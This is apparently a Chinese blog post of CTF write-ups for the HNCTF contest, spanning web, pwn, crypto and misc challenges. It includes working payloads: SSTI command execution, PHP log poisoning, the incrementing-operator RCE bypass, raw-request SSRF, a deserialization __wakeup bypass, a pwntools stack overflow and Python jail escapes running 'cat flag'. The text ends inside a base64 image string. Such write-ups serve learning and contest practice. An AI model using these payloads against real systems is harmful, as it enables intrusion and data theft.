---
title: HNCTF
date: 2022-11-02 20:36:39
tags: 
       - 赛后复盘
       - CTF
categories: 
       - [赛后复盘]
       - [CTF]
---

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210021920470.png?x-oss-process=hzy)

<!--more-->

-----------------------------

# WEB

## [Week1]easy_html

COOKIE有路径，访问得到一个页面

![image-20221002151506296](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210021515690.png?x-oss-process=hzy)

但是发现只能输进去十位，bp抓包随便十一位得到flag

![image-20221002151657202](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210021516282.png?x-oss-process=hzy)



NSSCTF{2f68a13b-427c-42ab-9c3a-ca7f7caa0361}

## [Week1]Interesting_include

题目如下

```
<?php
//WEB手要懂得搜索
//flag in ./flag.php

if(isset($_GET['filter'])){
    $file = $_GET['filter'];
    if(!preg_match("/flag/i", $file)){
        die("error");
    }
    include($file);
}else{
    highlight_file(__FILE__);
}
```

文件包含，直接base64读文件即可

![image-20221002152156289](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210021521388.png?x-oss-process=hzy)

> **php://filter**可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。

```
<?php

$flag = 'flag=NSSCTF{c7f78e2c-ae99-4e41-af41-926dcad08a16}';
?>
```

## [Week1]Interesting_http

首先是post传参

然后want=flag需要admin验证，改cookie

然后是本地验证，加xff

NSSCTF{3caa079f-e3c5-4198-a26e-72c82617dea0}

## [Week1]2048

游戏题，考察js泄露

直接找就找到flag了

![image-20221002153355965](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210021533029.png?x-oss-process=hzy)

![image-20221002153406159](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210021534232.png?x-oss-process=hzy)

NSSCTF{53160c888e25c3f828b23e316a7ae083}

## [Week1]easy_upload

直接上传个马

NSSCTF{95a44373-0b8f-4f8e-9a8f-29b807bb9e4d}

## [Week1]What is Web

扫目录发现/flag.php，没个卵用，抓包得到flag，就在源码里

![image-20221002161713521](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210021617585.png?x-oss-process=hzy)

NSSCTF{Hell0_Weber_Wec0m3_come_2_web_w0r1d!}

## [WEEK2]ez_SSTI

基础ssti

```
{{%20config.__class__.__init__.__globals__[%27os%27].popen(%27cat%20flag%27).read()%20}}
```

![image-20221006170429096](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061704173.png?x-oss-process=hzy)

NSSCTF{1d65a989-f8e6-4bcb-8172-bf47a66e9010}

## [WEEK2]easy_include

题目如下

```
<?php
//WEB手要懂得搜索

if(isset($_GET['file'])){
    $file = $_GET['file'];
    if(preg_match("/php|flag|data|\~|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\-|\_|\+|\=/i", $file)){
        die("error");
    }
    include($file);
}else{
    highlight_file(__FILE__);
}
```

![image-20221006174334071](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061743143.png?x-oss-process=hzy)

可以访问代表可以访问内网文件，访问日志文件

![image-20221006174457273](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061744359.png?x-oss-process=hzy)

基本思路就出来了，包含nginx日志，UA写🐎即可

![image-20221006174836674](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061748739.png?x-oss-process=hzy)

![image-20221006174845623](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061748683.png?x-oss-process=hzy)

NSSCTF{f91ead3d-322d-408c-944f-7726371b69b1}

## [WEEK2]Canyource

题目如下

```
<?php
highlight_file(__FILE__);
if(isset($_GET['code'])&&!preg_match('/url|show|high|na|info|dec|oct|pi|log|data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['code'])){
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {    
    eval($_GET['code']);}
else
    die('nonono');}
else
    echo('please input code');
?>  please input code
```

就是绕过过滤执行eval函数

```
?code=eval(end(current(get_defined_vars())));&a=system('ls;pwd');
```

然后cat，tac，nl，tail都被过滤了，读不了flag

用base64可读

![image-20221009172908730](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210091729830.png?x-oss-process=hzy)

```
Are you kinding me?<?php $flag="NSSCTF{d31fe1bf-39c6-46b5-a197-4f1ff6ddc1ad}"
```

NSSCTF{d31fe1bf-39c6-46b5-a197-4f1ff6ddc1ad}

## [WEEK2]ez_ssrf

主要代码如下

```
<?php

highlight_file(__FILE__);
error_reporting(0);

$data=base64_decode($_GET['data']);
$host=$_GET['host'];
$port=$_GET['port'];

$fp=fsockopen($host,intval($port),$error,$errstr,30);
if(!$fp) {
    die();
}
else {
    fwrite($fp,$data);
    while(!feof($data))
    {
        echo fgets($fp,128);
    }
    fclose($fp);
}
```



## [Week1]Challenge__rce(复现)

> hint:灵感来源于ctfshow吃瓜杯Y4大佬的题

```
?hint
```

```
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8"/>
    <title>Challenge_rce</title>
    <link rel="stylesheet" type="text/css" href="./css/index.css"/>
</head>

<body>
<!--?hint-->

</body>
</html>


<?php
error_reporting(0);
if (isset($_GET['hint'])) {
    highlight_file(__FILE__);
}
if (isset($_POST['rce'])) {
    $rce = $_POST['rce'];
    if (strlen($rce) <= 120) {
        if (is_string($rce)) {
            if (!preg_match("/[!@#%^&*:'\-<?>\"\/|`a-zA-Z~\\\\]/", $rce)) {
                eval($rce);
            } else {
                echo("Are you hack me?");
            }
        } else {
            echo "I want string!";
        }
    } else {
        echo "too long!";
    }
}
```

题目源码给了

是吃瓜杯的题目Shellme_Revenge的一小部分

测试一下可用符号

```
<?php
for($a = 0; $a < 256; $a++){
    if (!preg_match("/[!@#%^&*:'\-<?>\"\/|`a-zA-Z~\\\\]/", chr($a))){
        echo chr($a)." ";
    }
}
?>

```

可用符号还有

```
$ ( ) + , . 0 1 2 3 4 5 6 7 8 9 ; = [ ] _ { } 
```

无参rce，无疑了，到这里思路就断了，后来看佬的wp发现是使用自增rce，这里引用佬的一段解释吧

```
$_=[]._;$__=$_[1];$_=$_[0];$_++;$_1=++$_;$_++;$_++;$_++;$_++;$_=$_1.++$_.$__;$_=_.$_(71).$_(69).$_(84);$$_[1]($$_[2]);


GET
?1=system&2=ls

POST
rce=%24_%3D%5B%5D._%3B%24__%3D%24_%5B1%5D%3B%24_%3D%24_%5B0%5D%3B%24_%2B%2B%3B%24_1%3D%2B%2B%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24_1.%2B%2B%24_.%24__%3B%24_%3D_.%24_(71).%24_(69).%24_(84)%3B%24%24_%5B1%5D(%24%24_%5B2%5D)%3B

```

![image-20221101165621404](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211011656964.png?x-oss-process=hzy)

NSSCTF{02fdf7f1-a59e-4c6b-84ff-1bfc039671c5}

## [WEEK2]ez_ssrf(复现)

> 访问/index.php

题目名字就很明确是ssrf了，但是当时直接摆烂了

```
<?php

highlight_file(__FILE__);
error_reporting(0);

$data=base64_decode($_GET['data']);
$host=$_GET['host'];
$port=$_GET['port'];

$fp=fsockopen($host,intval($port),$error,$errstr,30);  // 传过去需要等待三十秒
if(!$fp) {
    die();
}
else {
    fwrite($fp,$data);
    while(!feof($data))
    {
        echo fgets($fp,128);
    }
    fclose($fp);
}
```

socket伪造http请求ssrf

```
GET /flag.php HTTP/1.1
Host: 43.143.195.203
Connection: Close
base64编码
R0VUIC9mbGFnLnBocCBIVFRQLzEuMQpIb3N0OiA0My4xNDMuMTk1LjIwMwpDb25uZWN0aW9uOiBDbG9zZQ==
```



```
?data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQpIb3N0OiA0My4xNDMuMTk1LjIwMwpDb25uZWN0aW9uOiBDbG9zZQ==&host=43.143.195.203&port=5000
```

![image-20221101170347213](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211011703301.png?x-oss-process=hzy)

发现带不出来，那就试试题目ip

```
R0VUIC9mbGFnLnBocCBIVFRQLzEuMQpIb3N0OiA0My4xNDMuNy45NwpDb25uZWN0aW9uOiBDbG9zZQ==
```

```
?data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQpIb3N0OiA0My4xNDMuMTk1LjIwMwpDb25uZWN0aW9uOiBDbG9zZQ==&host=43.143.7.97&port=5000
```

题目ip也不行需要是127的

```
GET /flag.php HTTP/1.1
Host: 127.0.0.1
Connection: Close

R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQo=
```

![image-20221101170907033](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211011709214.png?x-oss-process=hzy)

nssctf{095948b9b2be-8444-3750-99ba94d3b4f5}

## [WEEK2]easy_unser(复现)

题目如下

```
<?php 
    include 'f14g.php';
    error_reporting(0);

    highlight_file(__FILE__);

    class body{

    private $want,$todonothing = "i can't get you want,But you can tell me before I wake up and change my mind";

    public function  __construct($want){
        $About_me = "When the object is created,I will be called";
        if($want !== " ") $this->want = $want;
        else $this->want = $this->todonothing;
    }
    function __wakeup(){
        $About_me = "When the object is unserialized,I will be called";
        $but = "I can CHANGE you";
        $this-> want = $but;
        echo "C1ybaby!";
        
    }
    function __destruct(){
        $About_me = "I'm the final function,when the object is destroyed,I will be called";
        echo "So,let me see if you can get what you want\n";
        if($this->todonothing === $this->want)
            die("鲍勃,别傻愣着!\n");
        if($this->want == "I can CHANGE you")
            die("You are not you....");
        if($this->want == "f14g.php" OR is_file($this->want)){
            die("You want my heart?No way!\n");
        }else{
            echo "You got it!";
            highlight_file($this->want);
            }
    }
}

    class unserializeorder{
        public $CORE = "人类最大的敌人,就是无序. Yahi param vaastavikta hai!<BR>";
        function __sleep(){
            $About_me = "When the object is serialized,I will be called";
            echo "We Come To HNCTF,Enjoy the ser14l1zti0n <BR>";
        }
        function __toString(){
            $About_me = "When the object is used as a string,I will be called";
            return $this->CORE;
        }
    }
    
    $obj = new unserializeorder();
    echo $obj;
    $obj = serialize($obj);
    

    if (isset($_GET['ywant']))
    {
        $ywant = @unserialize(@$_GET['ywant']);
        echo $ywant;
    }
?>
人类最大的敌人,就是无序. Yahi param vaastavikta hai!
We Come To HNCTF,Enjoy the ser14l1zti0n
```

考察php反序列化

目标就是这里

![image-20221101171824388](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211011718462.png?x-oss-process=hzy)

传入的变量需要new一个新的body类

并且不能触发wakeup魔法函数，这个地方容易绕过.类中传入参数数量大于实际参数数量即可

其次还需要绕过这个条件

```
if($this->want == "f14g.php" OR is_file($this->want))
```

> 1.伪协议ls_file检测是除了file外的伪协议都是false
>
> 2.使用假目录  ./false/..f14g.php

```
<?php 

    class body{

    private $want,$todonothing = "i can't get you want,But you can tell me before I wake up and change my mind";

    public function  __construct($want){
        //$this->want = "php://filter/convert.base64-encode/resource=f14g.php";
        $this ->want = "./a/../f14g.php";
        $this ->todonothing = "22";
    }
}
$huang = new body();

echo(urlencode(serialize($huang)));
    

?>
//O%3A4%3A%22body%22%3A2%3A%7Bs%3A10%3A%22%00body%00want%22%3Bs%3A15%3A%22.%2Fa%2F..%2Ff14g.php%22%3Bs%3A17%3A%22%00body%00todonothing%22%3Bs%3A2%3A%2222%22%3B%7D
O:4:"body":2:{s:10:"bodywant";s:15:"./a/../f14g.php";s:17:"bodytodonothing";s:2:"22";}
O:4:"body":3:{s:10:"bodywant";s:15:"./a/../f14g.php";s:17:"bodytodonothing";s:2:"22";}

```

![image-20221101173513297](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211011735375.png?x-oss-process=hzy)

NSSCTF{b94b585e-b632-4ddd-9e91-eb77d89bc75e}

## [WEEK3]ssssti

显然存在ssti

![image-20221101175606020](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211011756124.png?x-oss-process=hzy)

fuzz发现过滤了如下

```
'
"  
_  
args   
os  
不允许post 
```

使用request.cookies构造上述的payload

```
?name={{self[request.cookies.c][request.cookies.d][request.cookies.e][request.cookies.f][request.cookies.g].open(request.cookies.z).read()}}


cookie:c=__dict__;d=_TemplateReference__context;e=lipsum;f=__globals__;g=__builtins__;z=flag

```

![image-20221101180051880](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211011800970.png?x-oss-process=hzy)

NSSCTF{c29e448f-55f7-4d9f-9d36-282a0e14d0e0}

# PWN

## [Week1]easync

两段flag，一个在nothing，一个在gift

nssctf{Nc_@nd_g3t5h31L}

## [Week1]easyoverflow

基础栈溢出漏洞

exp

```
from pwn import *
#p = process('./easy_overflow')
p = remote('43.143.7.97',28094)
pay= b'a'*54+p64(0x401214)
p.sendline(pay)
p.interactive()


```

![image-20221002170420162](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210021704229.png?x-oss-process=hzy)

nssctf{0h_You_OverFl0w_the_pr0gr@mm}

## [WEEK2]ret2text

> ret2text hint:远程环境存在栈对齐的问题（栈对齐是什么百度搜索） hint:试试partial overwrite绕过PIE

花式栈溢出，不会

# CRYPTO

## [Week1]baBAbaseSEse

base套娃

92-91-85-64-32--hex

NSSCTF{th3re_1s_als0_b4se_36_45_58_62_100}

## [Week1]你想学密码吗？

```
# encode = utf-8
# python3
# pycryptodemo 3.12.0

import Crypto.PublicKey as pk
from hashlib import md5
from functools import reduce

a = sum([len(str(i)) for i in pk.__dict__])
funcs = list(pk.__dict__.keys())
b = reduce(lambda a,b:a+b,[str(i) for i in funcs])
f = md5(b.encode()).hexdigest()
print('NSSCTF{' + f + '}')
```

```
NSSCTF{11db81a49b1826a3be8fb33f8ccb496d}
```

## [Week1]baby_rsa

```
from Crypto.Util.number import bytes_to_long, getPrime
from gmpy2 import *
from secret import flag
m = bytes_to_long(flag)
p = getPrime(128)
q = getPrime(128)
n = p * q
e = 65537
c = pow(m,e,n)
print(n,c)
# n=62193160459999883112594854240161159254035770172137079047232757011759606702281
# c=17331436837911040930486942133359735652484926528331507431552667656734821231501
```

知道n,c,e

n分解p,q

p = 234560843346150602519484260867514743467
q = 265147241000574873803071047177766359643

```
import libnum
from Crypto.Util.number import long_to_bytes
 
n=62193160459999883112594854240161159254035770172137079047232757011759606702281
c=17331436837911040930486942133359735652484926528331507431552667656734821231501

#n = int("",16)
e = 65537
#e = int("",16)

p = 234560843346150602519484260867514743467
q = 265147241000574873803071047177766359643


 
d = libnum.invmod(e, (p - 1) * (q - 1))
m = pow(c, d, n)   # m 的十进制形式
string = long_to_bytes(m)  # m明文
print(string)  # 结果为 b‘ m ’ 的形式
```

NSSCTF{Welc0m3_t0_7h3_RSA_w0r1d}

## [WEEK2]RSA again

题目如下

```
from Crypto.Util.number import *
from secret import flag

pad = lambda x:x + bytes([16 - len(x)%16] * (16 - len(x)%16))
m = bytes_to_long(pad(flag))
p = getPrime(1024)
q = getPrime(1024)
r = getPrime(1024)
s = getPrime(1024)

n1 = p*q
n2 = r*s

e1 = 0x3
e2 = 0x10001

c1 = pow(m,e1,n1)
c2 = pow(m,e2,n2)

print(f'n1 = {n1}')
print(f'n2 = {n2}')

print(f'e1 = {e1}')
print(f'e2 = {e2}')

print(f'c1 = {c1}')
print(f'c2 = {c2}')

'''
n1 = 19920284552214772740140135352548541831031690920425912140961436065508824546041514076016684238261995522677433833330399269923572993489681770913908642529489382472548548664350078176417366141695108301338793624641102311886122714705781923892243561473766978666116035403145672686443197319003393949350402512739343998236331447680561106899174404316265329944969786438022711742891334905159259854026408058542492105569778656883811323759583727586331462200020945101286801110840081277963013591342157754264111051785385892113635682519079401538045775697382691195557344630571694510115674941400112478156619785019370731073096018975390492287333
n2 = 16329690193309629244191723145720681753145067517963214005637012320130767690248475184382159868590994476900972592910808281306311987027465355492106975220876976952805197358639881107619560544543352300924359258546945240852850094015390140482140815264345348655887196971643211396274684514779113163628885090661524523232327450873503097327714815509514869056066300689707819915660849896274673178482085029145101175879255721581466301617903290840675945809027289325795423671263820619585424051649443606301277124322653881307702397752575258862656767834175467463999624688529625582031941402015943516022965802189663157681884162493551612612033
e1 = 3
e2 = 65537
c1 = 1752041777918702842605810950957832076618830231626916748933875881505173164404519153781007066742915517004902508987841695668088780745675304779496841107726530280651344357647334690721873124324358539328142005709830859468027528835981960873390785515876157664035579935532043154959183555353553164481674735512873428044452976229459806219115571797514157279125
c2 = 13118485959563304540673377439664643422000629435115361166348221705991314239675693340024813013156594762061646798463551395329521013651893257141697813554253378348002502855822191264845788826850528723400519059095869424931054523865083127809240502348046515579012160733570975234405522250330692499687684922633627550243811524972452606330768418753137605045204137872122584136368073471612976975360656501198000053578279110813009137808852376287556012668702182416374333935081007133880603708035832346742292444210108820267460698390600228183548619401334969739679892562475501201965275739796687679445529050630235296740377171065357995433586
'''

```

两道rsa，第一个是小e攻击

但是n很大，yafu分解

## [WEEK2]strange RSA

```
from Crypto.Util.number import *
from secret import flag

pad = lambda x:x + bytes([16 - len(x)%16] * (16 - len(x)%16))
m = bytes_to_long(pad(flag))
p = getPrime(100)
q = getPrime(100)
n = p*p*q*q
e = 0x10001
c = pow(m,e,n)

print(f'n = {n}')
print(f'c = {c}')
print(f'e = {e}')

'''
n = 564070152909085514893862673848191100242629745476416876533996976389897932324860687952230733393080567203972999049426141761
c = 269509453821913281608300827585653465889617103481995203776655691658799441157871331220899710463748827149644657719450056013
e = 65537
'''

```

直接yafu分解

```
P30 = 709662686105519282917793669093
P30 = 709662686105519282917793669093
P31 = 1058314117179226194777612760717
P31 = 1058314117179226194777612760717

```

然后一把梭

> ps:做题目一定要看清题，我刚开始以为就是正常的n，但是咋梭都出不来，后来再回来一看，n = p*p*q*q，，，，,我醉了

p，q真实的值应该是开根之后

不对，这题我不会，哪位师傅留个言带带我



## [WEEK2]md5太残暴了

题目如下

```

小明养成了定期修改密码的好习惯，同时，他还是一个CTF爱好者。有一天，他突发奇想，用flag格式来设置密码，为了防止忘记密码，他还把密码进行了md5加密。为了避免被其他人看到全部密码，他还特意修改了其中部分字符为#。你能猜出他的密码吗？
plaintext = flag{#00#_P4ssw0rd_N3v3r_F0rg3t_63####}
md5 = ac7f4d52c3924925aa9c8a7a1f522451
PS: 第一个#是大写字母，第二个#是小写字母，其他是数字。

```

就是爆破呗，走起来

```
import hashlib
from turtle import right

for g in range(ord('a'),ord('z')):
        for f in range(10):
            for e in range(10):
                for d in range(10):
                    for c in range(10):
                        for h in range(ord('A'),ord('Z')):
                            for g in range(ord('a'),ord('z')):
                        #for b in range(9):
                            #for a in range(9):
                                num="flag{"+chr(h)+"00"+chr(g)+"_P4ssw0rd_N3v3r_F0rg3t_63"+str(f)+str(e)+str(d)+str(c)+'}'
                                num_sha = hashlib.md5(num.encode('utf-8')).hexdigest()
                                #print(num_sha)
                                print(num)
                                #print(num_sha)
                                right = "ac7f4d52c3924925aa9c8a7a1f522451"
                                
                                #right = "f96d6e5d801f825d8f93aa7ed9e3922b"
                                if(num_sha == right):
                                
                                    print(num)
                                    print('success!!!')
                                    print('right flag!!!')
                                    exit()
                            
                                   
```

静静等待然后就出了，二十分钟，不多不少刚刚好

![image-20221014175238203](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210141752354.png?x-oss-process=hzy)

flag{G00d_P4ssw0rd_N3v3r_F0rg3t_638291}

## [WEEK2]hash

大同小异

把上题的脚本浅浅改一下就可以用了

```
import hashlib
from turtle import right

#for g in range(ord('a'),ord('z')):
for f in range(66,122):
    for e in range(66,122):
        for d in range(66,122):
            for c in range(66,122):
                #for h in range(ord('A'),ord('Z')):
                            #for g in range(ord('a'),ord('z')):
                        #for b in range(9):
                            #for a in range(9):
                                num=chr(f)+chr(e)+chr(d)+chr(c)+'PR6o0VJVhOvrobcr'
                                num_sha = hashlib.sha256(num.encode('utf-8')).hexdigest()
                                #print(num_sha)
                                print(num)
                                #print(num_sha)
                                right = "b5d2e3943477e375bcd11a7af6f68c3973690a888333afff3f048fc5ba598029"
                                
                                #right = "f96d6e5d801f825d8f93aa7ed9e3922b"
                                if(num_sha == right):
                                
                                    print(num)
                                    print('success!!!')
                                    print('right flag!!!')
                                    exit() 
                              
                            
                                   
```

远程交互

![image-20221014181052217](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210141810484.png?x-oss-process=hzy)

NSSCTF{ne4cat_1s_nece55arY_4nd_usefu1}

# MISC

## [Week1]简单编码

得到一个图片，url解码--->base64解码--->二进制转str得到flag

nssctf{nssctf_huanyingni}

## [Week1]calc_jail_beginner(JAIL)

附件如下

```
#Your goal is to read ./flag.txt
#You can use these payload liked `__import__('os').system('cat ./flag.txt')` or   `print(open('/flag.txt').read())`   // hint

WELCOME = '''
  _     ______      _                              _       _ _ 
 | |   |  ____|    (_)                            | |     (_) |
 | |__ | |__   __ _ _ _ __  _ __   ___ _ __       | | __ _ _| |
 | '_ \|  __| / _` | | '_ \| '_ \ / _ \ '__|  _   | |/ _` | | |
 | |_) | |___| (_| | | | | | | | |  __/ |    | |__| | (_| | | |
 |_.__/|______\__, |_|_| |_|_| |_|\___|_|     \____/ \__,_|_|_|
               __/ |                                           
              |___/                                            
'''

print(WELCOME)

print("Welcome to the python jail")
print("Let's have an beginner jail of calc")
print("Enter your expression and I will evaluate it for you.")
input_data = input("> ")
print('Answer: {}'.format(eval(input_data)))  // 即执行eval
```

```
__import__('os').system('cat flag')
```

NSSCTF{e3b53834-6ee0-4ccf-9f1a-9ef3a0941127}

## [Week1]piz.galf

打开附件发现内容是颠倒的

![image-20221002184140710](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210021841795.png?x-oss-process=hzy)

用两次这样的脚本

```
with open('pmb.galf','rb') as f:

   with open('flag.bmp','wb') as g:

      g.write(f.read()[::-1])

```

得到flag

![image-20221002184219282](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210021842340.png?x-oss-process=hzy)

NSSCTF{d1r0w_0ll3h}

## [Week1]my_png

藏了个压缩包，压缩包提示密码纯四位数字，直接掩码爆破

![image-20221002185415653](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210021854716.png?x-oss-process=hzy)

解压得到flag

NSSCTF{welc0me_t0_StegAn0graphY!!!}

## [Week1]python2 input(JAIL)

```
# It's escape this repeat!

WELCOME = '''
              _   _      ___        ___    _____             _    _ _   
             | | | |    / _ \      |__ \  |_   _|           | |  | | |  
  _ __  _   _| |_| |__ | | | |_ __    ) |   | |  _ __  _ __ | |  | | |_ 
 | '_ \| | | | __| '_ \| | | | '_ \  / /    | | | '_ \| '_ \| |  | | __|
 | |_) | |_| | |_| | | | |_| | | | |/ /_   _| |_| | | | |_) | |__| | |_ 
 | .__/ \__, |\__|_| |_|\___/|_| |_|____| |_____|_| |_| .__/ \____/ \__|
 | |     __/ |                                        | |               
 |_|    |___/                                         |_|                               
'''

print WELCOME

print "Welcome to the python jail"
print "But this program will repeat your messages"
input_data = input("> ")
print input_data

```

![image-20221002194208252](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210021942384.png?x-oss-process=hzy)

同上

NSSCTF{59945ba1-dea5-4c42-9f20-5f003b9c0eb4}

## [Week1]三生三世

附件是一个加密的压缩包，没有任何提示，凭直觉一点一点掩码爆破测试，得到密码xilan

![image-20221002195543746](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210021955838.png?x-oss-process=hzy)

得到

```
data:image/jpg;base64,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